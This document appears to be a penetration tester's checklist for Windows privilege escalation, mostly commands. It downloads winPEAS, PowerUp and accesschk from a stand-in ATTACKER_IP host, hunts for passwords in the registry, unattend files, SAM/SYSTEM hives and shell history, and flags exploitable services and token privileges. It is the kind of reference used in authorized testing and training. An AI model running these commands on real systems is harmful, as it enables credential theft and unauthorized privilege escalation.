## Initial Setup - Transfer Tools

```powershell
# Download files using PowerShell
certutil -urlcache -f http://ATTACKER_IP/winPEAS.exe winPEAS.exe
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP/winPEAS.exe' -OutFile 'winPEAS.exe'"
IWR -Uri http://ATTACKER_IP/winPEAS.exe -OutFile winPEAS.exe

# Download PowerUp.ps1
IWR -Uri http://ATTACKER_IP/PowerUp.ps1 -OutFile PowerUp.ps1

# Download accesschk.exe (Sysinternals)
IWR -Uri http://ATTACKER_IP/accesschk.exe -OutFile accesschk.exe
```

## Automated Enumeration

- [ ] **Run WinPEAS**

```cmd
winPEAS.exe
winPEAS.exe > output.txt
```

- [ ] **Run PowerUp**

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

## Manual Enumeration Checklist

### System Information

- [ ] **OS Version & Architecture**

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption,OSArchitecture,Version
```

- [ ] **Hostname**

```cmd
hostname
```

- [ ] **Environment Variables**

```cmd
set
Get-ChildItem Env: | ft Key,Value
```

### User Enumeration

- [ ] **Current User & Privileges**

```cmd
whoami
whoami /priv
whoami /groups
```

- [ ] **List All Users**

```cmd
net user
net localgroup administrators
Get-LocalUser
Get-LocalGroupMember Administrators
```

- [ ] **Logged-in Users**

```cmd
query user
qwinsta
```

### Password Hunting

- [ ] **Registry for Passwords**

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

- [ ] **Unattend Files**

```cmd
dir /s *unattend.xml
dir /s *sysprep.xml
dir /s *autounattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
```

- [ ] **Stored Credentials**

```cmd
cmdkey /list
runas /savecred /user:administrator cmd.exe
```

- [ ] **Credential Manager**

```powershell
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials"
```

- [ ] **SAM & SYSTEM Files**

```cmd
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\System32\config\SYSTEM
```

- [ ] **PowerShell History**

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
Get-Content (Get-PSReadlineOption).HistorySavePath
```

- [ ] **IIS Configuration Files**

```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### File System Checks

- [ ] **Search for Interesting Files**

```cmd
dir /s *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* 2>nul
where /R C:\ *.ini *.xml *.txt *.config 2>nul | findstr /i "pass"
findstr /si password *.xml *.ini *.txt *.config 2>nul
```

- [ ] **Writable Directories in PATH**

```cmd
for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

- [ ] **AlwaysInstallElevated Registry Keys**

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Services

- [ ] **List All Services**

```cmd
sc query
Get-Service
wmic service list brief
net start
```

- [ ] **Unquoted Service Paths**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

- [ ] **Service Permissions (Weak Permissions)**

```cmd
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv %USERNAME% *
accesschk.exe /accepteula -ucqv [SERVICE_NAME]
sc qc [SERVICE_NAME]
sc sdshow [SERVICE_NAME]
```

- [ ] **Modifiable Service Binaries**

```cmd
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

- [ ] **Service Registry Permissions**

```cmd
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services
```

### Scheduled Tasks

- [ ] **List Scheduled Tasks**

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "Task To Run:"
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

- [ ] **Check Task Permissions**

```cmd
icacls C:\path\to\task\binary.exe
accesschk.exe /accepteula -dqv "C:\path\to\task\folder"
```

### Running Processes

- [ ] **List Running Processes**

```cmd
tasklist /v
Get-Process
wmic process list brief
wmic process get name,executablepath,processid
```

- [ ] **Check Process Permissions**

```cmd
tasklist /SVC
Get-Process | Select-Object ProcessName,Id,Path
```

### Network Information

- [ ] **Network Configuration**

```cmd
ipconfig /all
```

- [ ] **Routing Table**

```cmd
route print
```

- [ ] **ARP Cache**

```cmd
arp -a
```

- [ ] **Network Connections**

```cmd
netstat -ano
netstat -ano | findstr LISTENING
```

- [ ] **Firewall Status**

```cmd
netsh firewall show state
netsh advfirewall firewall show rule name=all
netsh advfirewall show allprofiles
```

- [ ] **Network Shares**

```cmd
net share
wmic share get Name,Path
```

### Installed Software

- [ ] **List Installed Programs**

```cmd
wmic product get name,version
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
```

- [ ] **Check for Exploitable Software**

```cmd
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
```

### Kernel Exploits

- [ ] **Check for Missing Patches**

```cmd
systeminfo
wmic qfe list
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- [ ] **Use Windows Exploit Suggester**

```bash
# On attacker machine
python windows-exploit-suggester.py --database 2024-12-15-mssb.xls --systeminfo systeminfo.txt
```

### Token Manipulation

- [ ] **Check Token Privileges**

```cmd
whoami /priv
```

**Common Exploitable Privileges:**

- `SeImpersonatePrivilege` - Potato attacks (JuicyPotato, RoguePotato, PrintSpoofer)
- `SeAssignPrimaryToken` - Potato attacks
- `SeBackupPrivilege` - Backup SAM/SYSTEM
- `SeRestorePrivilege` - Restore malicious files
- `SeDebugPrivilege` - Debug/inject processes
- `SeTakeOwnershipPrivilege` - Take file ownership
- `SeLoadDriverPrivilege` - Load malicious drivers

### DLL Hijacking

- [ ] **Check for Missing DLLs (Use Process Monitor)**

```powershell
# Look for NAME NOT FOUND entries in Process Monitor
```

- [ ] **Check Writable System Directories**

```cmd
icacls "C:\Windows\System32"
accesschk.exe /accepteula -uwdq "C:\Windows\System32"
```

### Startup Applications

- [ ] **Check Startup Folders**

```cmd
dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- [ ] **Registry Run Keys**

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

### Antivirus & Security Software

- [ ] **Check AV Status**

```cmd
sc query windefend
netsh advfirewall show currentprofile
wmic /namespace:\\root\securitycenter2 path antivirusproduct
Get-MpComputerStatus
Get-MpPreference
```

- [ ] **Check AppLocker**

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Group Policy

- [ ] **Check GPO Settings**

```cmd
gpresult /r
gpresult /z
```

### Windows Subsystem for Linux (WSL)

- [ ] **Check for WSL**

```cmd
where /R C:\Users bash.exe
where /R C:\Users wsl.exe
```

## Quick One-Liners

```cmd
# Quick service check
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

# Quick privilege check
whoami /priv | findstr "SeImpersonate\|SeAssignPrimaryToken\|SeBackup\|SeRestore\|SeDebug\|SeTakeOwnership"

# Quick password hunt
findstr /si password *.xml *.ini *.txt *.config 2>nul

# Quick writable services
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>nul

# Quick unquoted service paths
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```